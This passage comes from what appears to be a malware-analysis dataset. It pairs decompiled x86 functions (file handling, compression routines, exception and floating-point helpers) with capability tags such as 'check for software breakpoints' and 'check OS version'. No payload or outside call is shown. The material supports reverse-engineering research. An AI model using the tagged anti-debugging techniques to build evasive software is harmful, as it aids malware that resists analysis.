0x10) == in_ECX + 0x48) {\n                    uVar4 = *(in_ECX + 0x40);\n                    **(in_ECX + 0x10) = *(in_ECX + 0x3c);\n                    **(in_ECX + 0x20) = uVar4;\n                    **(in_ECX + 0x30) = 0;\n                }\n                if (*(in_ECX + 0x44) != 0) {\n                    var_30h = var_30h & 0xffffff00 | arg_8h & 0xff;\n                    var_18h = 0xf;\n                    var_1ch = 0;\n                    var_2ch = var_2ch & 0xffffff00;\n                    fcn.0042acb0(&var_2ch, 0, 8, var_10h);\n                    var_1ch = 8;\n                    puVar7 = var_2ch;\n                    if (var_18h < 0x10) {\n                        puVar7 = &var_2ch;\n                    }\n                    *(puVar7 + 2) = 0;\n                    var_4h = 0;\ncode_r0x0041a613:\n                    puVar7 = var_2ch;\n                    if (var_18h < 0x10) {\n                        puVar7 = &var_2ch;\n                    }\n                    iVar6 = (**(**(in_ECX + 0x44) + 0x14))\n                                      (in_ECX + 0x4c, &var_30h, &var_30h + 1, &var_38h, puVar7, puVar7 + var_1ch, \n                                       &var_34h);\n                    if (iVar6 < 0) goto code_r0x0041a6f9;\n                    if (iVar6 < 2) {\n                        puVar7 = var_2ch;\n                        if (var_18h < 0x10) {\n                            puVar7 = &var_2ch;\n                        }\n                        iVar6 = var_34h - puVar7;\n                        if (iVar6 != 0) {\n                            puVar7 = var_2ch;\n                            if (var_18h < 0x10) {\n                                puVar7 = &var_2ch;\n                            }\n                            iVar8 = fcn.0042e597(puVar7, 1, iVar6, *(in_ECX + 0x54));\n                            if (iVar6 != iVar8) goto code_r0x0041a6f9;\n                        }\n                        *(in_ECX + 0x49) = 1;\n                        if (var_38h == &var_30h) goto code_r0x0041a694;\n                        fcn.00405ce0();\n                    }\n                    else {\n                        if (iVar6 != 3) goto code_r0x0041a6f9;\n                        cVar5 = fcn.00419970(var_30h, *(in_ECX + 0x54));\n                        if (cVar5 == '\\0') {\n                            fcn.00405ce0();\n                        }\n                        else {\n                            fcn.00405ce0();\n                        }\n                    }\n                    goto code_r0x0041a701;\n                }\n                fcn.0042dcf2(arg_8h, *(in_ECX + 0x54));\n            }\n        }\n        else {\n            *piVar2 = *piVar2 + -1;\n            pcVar3 = **(in_ECX + 0x24);\n            **(in_ECX + 0x24) = pcVar3 + 1;\n            *pcVar3 = arg_8h;\n        }\n    }\ncode_r0x0041a701:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(var_38h);\n    return;\ncode_r0x0041a694:\n    if (iVar6 == 0) {\n        if (0x1f < var_1ch) {\ncode_r0x0041a6f9:\n            fcn.00405ce0();\n            goto code_r0x0041a701;\n        }\n        fcn.0040bc10(8, 0);\n    }\n    goto code_r0x0041a613;\n}\n",
        "token_count": 1287
    },
    "0041ac80": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ac80(uchar *arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_ch_00;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ec28;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_34h = arg_18h;\n    var_30h = 0;\n    var_10h = uVar1;\n    if (arg_10h < 3) {\ncode_r0x0041adc7:\n        arg_8h_00 = fcn.00415b40(arg_ch, arg_10h);\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        arg_ch_00 = fcn.0042b420(arg_8h_00, arg_ch, arg_10h, uVar1);\n    }\n    else {\n        iVar2 = fcn.0042c233(arg_ch, 0x4473b4, 3);\n        if (iVar2 != 0) goto code_r0x0041adc7;\n        if ((arg_14h != 0) && (var_34h != 0)) {\n            fcn.0042acb0(&var_74h, 0, 0x40);\n            var_6ch = arg_ch + 3;\n            var_5ch = (arg_10h - 0x13) + var_6ch;\n            var_30h = arg_10h - 0x1f;\n            var_74h = 0x40;\n            var_70h = 1;\n            var_68h = 0xc;\n            var_58h = 0x10;\n            iVar2 = (**0x469200)(0x40, var_30h);\n            if (iVar2 != 0) {\n                iVar3 = (**0x4692a0)(var_34h, var_68h + var_6ch, var_30h, &var_74h, 0, 0, iVar2, var_30h, &var_30h, 0);\n                if (-1 < iVar3) {\n                    fcn.00419e70(iVar2, var_30h);\n                    var_4h = 0;\n                    fcn.00406430(&var_2ch);\n                    fcn.00405ce0();\n                    goto code_r0x0041adf3;\n                }\n            }\n            fcn.00406370(0x446f90);\n            goto code_r0x0041adf3;\n        }\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        arg_ch_00 = fcn.0042b420(0x446f90);\n        arg_8h_00 = 0x446f90;\n    }\n    fcn.00406270(arg_8h_00, arg_ch_00);\ncode_r0x0041adf3:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 924
    },
    "00427720": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427720(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    if ((((*(in_ECX + 4) != 0) || (*(in_ECX + 0xc) != 0)) || (*(in_ECX + 0x20) != 0)) ||\n       (((*(in_ECX + 0x18) != 0 || (*(in_ECX + 0x14) != 0)) || (*(in_ECX + 0x2c) != '\\0')))) {\n        return 0x1000000;\n    }\n    if (arg_10h == 1) {\n        *(in_ECX + 4) = arg_8h;\n        *(in_ECX + 8) = 0;\n        uVar1 = (**0x469108)(arg_8h, 0, 0, 1);\n        *(in_ECX + 0x1c) = uVar1 != 0xffffffff;\n        *(in_ECX + 0x10) = -(uVar1 != 0xffffffff) & uVar1;\n        return 0;\n    }\n    if (arg_10h == 2) {\n        iVar2 = (**0x4690ec)(arg_8h, 0x40000000, 0, 0, 2, 0x80, 0);\n        *(in_ECX + 4) = iVar2;\n        if (iVar2 == -1) {\n            *(in_ECX + 4) = 0;\n            return 0x200;\n        }\n        *(in_ECX + 0x10) = 0;\n        *(in_ECX + 0x1c) = 1;\n        *(in_ECX + 8) = 1;\n        return 0;\n    }\n    if (arg_10h != 3) {\n        return 0x10000;\n    }\n    if (arg_ch == 0) {\n        return 0x30000;\n    }\n    if (arg_8h != 0) {\n        *(in_ECX + 0x20) = arg_8h;\ncode_r0x00427801:\n        *(in_ECX + 0x28) = arg_ch;\n        *(in_ECX + 0x24) = 0;\n        *(in_ECX + 0x1c) = 1;\n        return 0;\n    }\n    iVar2 = (**0x4690dc)(0xffffffff, 0, 4, 0, arg_ch, 0);\n    *(in_ECX + 0xc) = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (**0x469254)(iVar2, 0xf001f, 0, 0, arg_ch);\n        *(in_ECX + 0x20) = iVar2;\n        if (iVar2 != 0) goto code_r0x00427801;\n        (**0x4690f0)(*(in_ECX + 0xc));\n        *(in_ECX + 0xc) = 0;\n    }\n    return 0x300;\n}\n",
        "token_count": 716
    },
    "004283c0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004283c0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    fcn.004260c0(arg_8h, arg_8h + 0x14, *(arg_8h + 0xfa8));\n    fcn.004260c0(arg_8h, arg_8h + 0x908, *(arg_8h + 0xfc4));\n    fcn.00428060(arg_8h, arg_8h + 0xfc8);\n    iVar1 = 0x12;\n    do {\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x44828c) * 4) != 0) {\ncode_r0x0042848e:\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + iVar1 * 3 + 0x11;\n            return;\n        }\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x44828b) * 4) != 0) {\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + (iVar1 + -1) * 3 + 0x11;\n            return;\n        }\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x44828a) * 4) != 0) {\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + (iVar1 + -2) * 3 + 0x11;\n            return;\n        }\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x448289) * 4) != 0) {\n            iVar1 = iVar1 + -3;\n            goto code_r0x0042848e;\n        }\n        iVar1 = iVar1 + -4;\n        if (iVar1 < 3) {\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + iVar1 * 3 + 0x11;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 518
    },
    "00428f50": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428f50(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    arg_8h_00 = arg_8h;\n    iVar3 = 0;\n    uVar4 = 0;\n    *(arg_8h + 0x6af80) = 2;\n    iVar1 = *(arg_8h + 0x6af90);\n    while (iVar1 != 0) {\n        if (2 < *(arg_8h_00 + 0x6af90)) {\n            uVar2 = (*(*(arg_8h_00 + 0x6af84) + 0x1af72 + arg_8h_00) ^ *(arg_8h_00 + 0x6af7c) << 5) & 0x7fff;\n            *(arg_8h_00 + 0x6af7c) = uVar2;\n            iVar3 = *(arg_8h_00 + 0x4af70 + uVar2 * 4);\n            *(arg_8h_00 + 0x2af70 + (*(arg_8h_00 + 0x6af84) & 0x7fff) * 4) = iVar3;\n            *(arg_8h_00 + 0x4af70 + *(arg_8h_00 + 0x6af7c) * 4) = *(arg_8h_00 + 0x6af84);\n        }\n        if ((iVar3 != 0) && (*(arg_8h_00 + 0x6af84) - iVar3 < 0x7efb)) {\n            uVar4 = *(arg_8h_00 + 0x6af90);\n            if (uVar4 <= *(arg_8h_00 + 0x6afa0) && *(arg_8h_00 + 0x6afa0) != uVar4) {\n                *(arg_8h_00 + 0x6afa0) = uVar4;\n            }\n            uVar4 = fcn.004266d0(arg_8h_00, iVar3);\n            if (*(arg_8h_00 + 0x6af90) < uVar4) {\n                uVar4 = *(arg_8h_00 + 0x6af90);\n            }\n        }\n        if (uVar4 < 3) {\n            arg_8h = fcn.004261a0(arg_8h_00, 0, *(*(arg_8h_00 + 0x6af84) + 0x1af70 + arg_8h_00));\n            *(arg_8h_00 + 0x6af90) = *(arg_8h_00 + 0x6af90) + -1;\n            *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + 1;\n        }\n        else {\n            arg_8h = fcn.004261a0(arg_8h_00, *(arg_8h_00 + 0x6af84) - *(arg_8h_00 + 0x6af88), uVar4 - 3);\n            *(arg_8h_00 + 0x6af90) = *(arg_8h_00 + 0x6af90) - uVar4;\n            if ((uVar4 < *(arg_8h_00 + 0x6af98) || uVar4 == *(arg_8h_00 + 0x6af98)) && (2 < *(arg_8h_00 + 0x6af90))) {\n                uVar4 = uVar4 - 1;\n                do {\n                    *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + 1;\n                    uVar2 = (*(arg_8h_00 + 0x1af72 + *(arg_8h_00 + 0x6af84)) ^ *(arg_8h_00 + 0x6af7c) << 5) & 0x7fff;\n                    *(arg_8h_00 + 0x6af7c) = uVar2;\n                    iVar3 = *(arg_8h_00 + 0x4af70 + uVar2 * 4);\n                    uVar4 = uVar4 - 1;\n                    *(arg_8h_00 + 0x2af70 + (*(arg_8h_00 + 0x6af84) & 0x7fff) * 4) = iVar3;\n                    *(arg_8h_00 + 0x4af70 + *(arg_8h_00 + 0x6af7c) * 4) = *(arg_8h_00 + 0x6af84);\n                } while (uVar4 != 0);\n                *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + 1;\n            }\n            else {\n                *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + uVar4;\n                uVar2 = *(*(arg_8h_00 + 0x6af84) + 0x1af70 + arg_8h_00);\n                *(arg_8h_00 + 0x6af7c) = uVar2;\n                uVar4 = 0;\n                *(arg_8h_00 + 0x6af7c) = *(*(arg_8h_00 + 0x6af84) + 0x1af71 + arg_8h_00) ^ uVar2 << 5;\n            }\n        }\n        if (arg_8h != 0) {\n            iVar1 = *(arg_8h_00 + 0x6af74);\n            if (iVar1 < 0) {\n                arg_ch = 0;\n            }\n            else {\n                arg_ch = iVar1 + 0x1af70 + arg_8h_00;\n            }\n            fcn.00428dc0(arg_8h_00, arg_ch, *(arg_8h_00 + 0x6af84) - iVar1, 0);\n            *(arg_8h_00 + 0x6af74) = *(arg_8h_00 + 0x6af84);\n        }\n        if (*(arg_8h_00 + 0x6af90) < 0x106) {\n            fcn.00426830(arg_8h_00);\n        }\n        iVar1 = *(arg_8h_00 + 0x6af90);\n    }\n    iVar1 = *(arg_8h_00 + 0x6af74);\n    if (iVar1 < 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = iVar1 + 0x1af70 + arg_8h_00;\n    }\n    fcn.00428dc0(arg_8h_00, iVar3, *(arg_8h_00 + 0x6af84) - iVar1, 1);\n    return;\n}\n",
        "token_count": 1674
    },
    "004291a0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004291a0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    bVar3 = false;\n    uVar7 = 2;\n    if (3 < *(arg_8h + 4)) {\n        if (*(arg_8h + 0x6af90) != 0) {\n            do {\n                if (2 < *(arg_8h + 0x6af90)) {\n                    uVar4 = (*(*(arg_8h + 0x6af84) + 0x1af72 + arg_8h) ^ *(arg_8h + 0x6af7c) << 5) & 0x7fff;\n                    *(arg_8h + 0x6af7c) = uVar4;\n                    var_8h = *(arg_8h + 0x4af70 + uVar4 * 4);\n                    *(arg_8h + 0x2af70 + (*(arg_8h + 0x6af84) & 0x7fff) * 4) = var_8h;\n                    *(arg_8h + 0x4af70 + *(arg_8h + 0x6af7c) * 4) = *(arg_8h + 0x6af84);\n                }\n                iVar5 = *(arg_8h + 0x6af88);\n                *(arg_8h + 0x6af80) = uVar7;\n                uVar7 = 2;\n                if (((var_8h != 0) && (*(arg_8h + 0x6af80) < *(arg_8h + 0x6af98))) &&\n                   (*(arg_8h + 0x6af84) - var_8h < 0x7efb)) {\n                    uVar7 = *(arg_8h + 0x6af90);\n                    if (uVar7 <= *(arg_8h + 0x6afa0) && *(arg_8h + 0x6afa0) != uVar7) {\n                        *(arg_8h + 0x6afa0) = uVar7;\n                    }\n                    uVar7 = fcn.004266d0(arg_8h, var_8h);\n                    if (*(arg_8h + 0x6af90) < uVar7) {\n                        uVar7 = *(arg_8h + 0x6af90);\n                    }\n                    if ((uVar7 == 3) && (0x1000 < *(arg_8h + 0x6af84) - *(arg_8h + 0x6af88))) {\n                        uVar7 = 2;\n                    }\n                }\n                uVar4 = *(arg_8h + 0x6af80);\n                if ((uVar4 < 3) || (uVar4 < uVar7)) {\n                    if (bVar3) {\n                        iVar5 = fcn.004261a0(arg_8h, 0, *(*(arg_8h + 0x6af84) + 0x1af6f + arg_8h));\n                        if (iVar5 != 0) {\n                            iVar5 = *(arg_8h + 0x6af74);\n                            if (iVar5 < 0) {\n                                iVar6 = 0;\n                            }\n                            else {\n                                iVar6 = iVar5 + 0x1af70 + arg_8h;\n                            }\n                            fcn.00428dc0(arg_8h, iVar6, *(arg_8h + 0x6af84) - iVar5, 0);\n                            *(arg_8h + 0x6af74) = *(arg_8h + 0x6af84);\n                        }\n                        *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                    }\n                    else {\n                        *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                        bVar3 = true;\n                    }\n                    *(arg_8h + 0x6af90) = *(arg_8h + 0x6af90) + -1;\n                }\n                else {\n                    iVar6 = *(arg_8h + 0x6af84);\n                    iVar2 = *(arg_8h + 0x6af90);\n                    iVar5 = fcn.004261a0(arg_8h, (iVar6 - iVar5) + -1, uVar4 - 3);\n                    *(arg_8h + 0x6af90) = *(arg_8h + 0x6af90) + (1 - *(arg_8h + 0x6af80));\n                    *(arg_8h + 0x6af80) = *(arg_8h + 0x6af80) + -2;\n                    do {\n                        *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                        uVar7 = *(arg_8h + 0x6af84);\n                        if (uVar7 <= iVar6 + -3 + iVar2) {\n                            uVar4 = (*(uVar7 + 0x1af72 + arg_8h) ^ *(arg_8h + 0x6af7c) << 5) & 0x7fff;\n                            *(arg_8h + 0x6af7c) = uVar4;\n                            var_8h = *(arg_8h + 0x4af70 + uVar4 * 4);\n                            *(arg_8h + 0x2af70 + (uVar7 & 0x7fff) * 4) = var_8h;\n                            *(arg_8h + 0x4af70 + *(arg_8h + 0x6af7c) * 4) = *(arg_8h + 0x6af84);\n                        }\n                        piVar1 = arg_8h + 0x6af80;\n                        *piVar1 = *piVar1 + -1;\n                    } while (*piVar1 != 0);\n                    *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                    bVar3 = false;\n                    uVar7 = 2;\n                    if (iVar5 != 0) {\n                        iVar5 = *(arg_8h + 0x6af74);\n                        if (iVar5 < 0) {\n                            iVar6 = 0;\n                        }\n                        else {\n                            iVar6 = iVar5 + 0x1af70 + arg_8h;\n                        }\n                        fcn.00428dc0(arg_8h, iVar6, *(arg_8h + 0x6af84) - iVar5, 0);\n                        *(arg_8h + 0x6af74) = *(arg_8h + 0x6af84);\n                    }\n                }\n                if (*(arg_8h + 0x6af90) < 0x106) {\n                    fcn.00426830(arg_8h);\n                }\n            } while (*(arg_8h + 0x6af90) != 0);\n            if (bVar3) {\n                fcn.004261a0(arg_8h, 0, *(*(arg_8h + 0x6af84) + 0x1af6f + arg_8h));\n            }\n        }\n        iVar5 = *(arg_8h + 0x6af74);\n        if (iVar5 < 0) {\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = iVar5 + 0x1af70 + arg_8h;\n        }\n        fcn.00428dc0(arg_8h, iVar6, *(arg_8h + 0x6af84) - iVar5, 1);\n        return;\n    }\n    fcn.00428f50(arg_8h);\n    return;\n}\n",
        "token_count": 1871
    },
    "00430b0f": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430b0f(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0042bdaf(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00432e72();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00432e72();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0042bd88(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00430896(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "0043c47d": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0043c47d(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4579e0;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4579dc + -1;\n        iVar14 = *0x4579dc + (*0x4579dc >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4579dc & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0043c5c1;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0043c5c8;\ncode_r0x0043c5c1:\n                        do {\n                            bVar6 = true;\ncode_r0x0043c5c8:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0043c5d6;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0043c5d6:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4579d8 - *0x4579dc) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4579d8 < iVar14) {\n                if (iVar14 < *0x4579d4) {\n                    iVar14 = iVar14 + *0x4579e8;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4579e0 + (*0x4579e0 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4579e0 + (*0x4579e0 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4579e8 + *0x4579d4;\n                }\n                goto code_r0x0043c981;\n            }\n            iVar13 = *0x4579d8 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4579dc + -1;\n            iVar13 = *0x4579dc + (*0x4579dc >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4579dc & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0043c775;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0043c775:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4579e0 + 1 + (*0x4579e0 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } 